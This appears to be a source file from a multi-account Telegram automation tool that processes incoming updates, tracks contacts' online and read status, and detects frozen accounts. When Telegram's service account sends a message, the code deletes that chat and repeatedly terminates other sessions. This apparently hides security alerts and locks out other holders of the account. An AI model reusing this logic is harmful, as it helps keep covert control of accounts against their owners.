import BigInt from 'big-integer';

import { TelegramClient } from '../../../gramjs';
import GramJs from '../../../gramjs/tl/api';
import {
  getDialogue,
  updateDialogue,
  updateSimpleDialogue,
} from '../../db/dialogues';
import { invokeRequest } from '../../modules/invokeRequest';
import { clearAuthorizations } from '../account/clearAuthorizations';
import { deleteHistory } from '../messages/deleteHistory';

const deleteMessagesTimers = new Map<string, NodeJS.Timeout>();

function findValue(obj: Record<string, any>, valueKey: string) {
  return (
    obj[valueKey] ||
    obj.peer?.[valueKey] ||
    obj.message?.[valueKey] ||
    obj.message?.fromId?.[valueKey] ||
    obj.message?.peer?.[valueKey] ||
    obj.message?.peerId?.[valueKey]
  );
}

export const handleUpdate = async (
  client: TelegramClient | null,
  accountId: string,
  update: any,

  onNewMessage: () => void,
  onNewError: (error: string) => void
) => {
  if (!update) {
    return;
  }

  const userId = findValue(update, 'userId');
  if (userId && update instanceof GramJs.UpdateUserStatus) {
    if (update.status instanceof GramJs.UserStatusOffline) {
      await updateSimpleDialogue(accountId, String(userId), {
        dateLastOnline: new Date(Number(`${update.status.wasOnline}000`)),
      });
    }
    if (update.status instanceof GramJs.UserStatusOnline) {
      await updateSimpleDialogue(accountId, String(userId), {
        dateLastOnline: new Date(Number(`${update.status.expires}000`)),
      });
    }
  }

  if (
    update.className === 'UpdateConnectionState' ||
    update.className === 'UpdateUserStatus' ||
    update.className === 'UpdateUserTyping' ||
    update.className === 'Pong'
  ) {
    return;
  }

  console.log({
    accountId,
    message: `<${update.className}>`,
    payload: JSON.parse(JSON.stringify(update)),
  });

  if (
    update instanceof GramJs.UpdateNewMessage ||
    update instanceof GramJs.UpdateShortMessage
  ) {
    if (userId) {
      const dialog = await getDialogue(accountId, String(userId));
      if (dialog && !dialog.reason && !dialog.automaticReason) {
        onNewMessage();
      }

      if (
        client &&
        update instanceof GramJs.UpdateShortMessage &&
        String(userId) === '777000'
      ) {
        console.warn({
          accountId,
          message: '[TELEGRAM_SERVICE_NOTIFICATION]',
          payload: JSON.parse(JSON.stringify(update)),
        });

        await deleteHistory(
          client,
          new GramJs.InputPeerUser({
            userId: update.userId,
            accessHash: BigInt(0),
          }),
          true
        );

        [0.05, 0.15, 0.25, 0.5, 1, 1.5, 2.5, 5].forEach((minutes) => {
          setTimeout(
            async () => {
              try {
                if (!client._sender.userDisconnected) {
                  await clearAuthorizations(client);
                }
              } catch {}
            },
            minutes * 60 * 1000
          );
        });
      }
    }
  } else if (
    update instanceof GramJs.UpdateReadHistoryOutbox ||
    update instanceof GramJs.UpdateReadHistoryInbox
  ) {
    if (userId && update.maxId) {
      const dialog = await getDialogue(accountId, String(userId));

      if (
        !dialog ||
        !dialog.messages ||
        !Array.isArray(dialog.messages) ||
        !dialog.messages.length
      ) {
        return;
      }

      if (dialog.messages[dialog.messages.length - 1].id === update.maxId) {
        await updateDialogue({
          accountId,
          recipientId: String(userId),
          read: true,
          dateLastRead: new Date(),
        });
      }
    }
  } else if (update instanceof GramJs.UpdateDeleteMessages) {
    const existingTimer = deleteMessagesTimers.get(accountId);
    if (existingTimer) {
      clearTimeout(existingTimer);
    }

    const timer = setTimeout(async () => {
      try {
        if (!client) return;

        const appConfig = await invokeRequest(
          client,
          new GramJs.help.GetAppConfig({})
        );

        if (
          !appConfig ||
          appConfig instanceof GramJs.help.AppConfigNotModified ||
          appConfig.config instanceof GramJs.JsonNull
        ) {
          onNewError('APP_CONFIG_NOT_DEFINED');
          return;
        }

        const {
          config: { value },
        } = appConfig;

        const isFrozen = Boolean(
          value.find((k: any) => ({ ...k }).key === 'freeze_until_date')
        );

        if (isFrozen) {
          onNewError('ACCOUNT_FROZEN');
          return;
        }
      } catch (error: any) {
        onNewError(error.message);
      } finally {
        deleteMessagesTimers.delete(accountId);
      }
    }, 5000);

    deleteMessagesTimers.set(accountId, timer);
  }
};
